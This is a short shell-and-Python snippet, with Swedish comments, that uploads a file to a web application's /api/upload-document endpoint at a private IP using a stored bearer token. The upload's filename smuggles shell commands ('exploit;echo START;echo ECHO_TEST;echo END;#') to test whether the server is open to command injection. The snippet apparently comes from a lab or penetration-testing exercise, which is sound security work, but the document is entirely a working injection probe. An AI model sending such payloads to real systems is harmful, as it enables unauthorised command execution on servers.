# skapa en minimal fil
printf "x" > min.bin

# kör python-skript som laddar upp med filename som ekoar START/ECHO_TEST/END
python3 - <<'PY'
import requests, os, json
TOKEN = open(os.path.expanduser("~/.config/tatou/token08.txt")).read().strip()
TARGET = "http://10.11.12.9:5000"
payload_filename = "exploit;echo START;echo ECHO_TEST;echo END;#"
with open("min.bin","rb") as f:
    files = {"file": (payload_filename, f, "application/octet-stream")}
    r = requests.post(f"{TARGET}/api/upload-document", headers={"Authorization":f"Bearer {TOKEN}"}, files=files)
    print("UPLOAD:", r.status_code)
    try:
        print(r.json())
    except:
        print(r.text)
PY

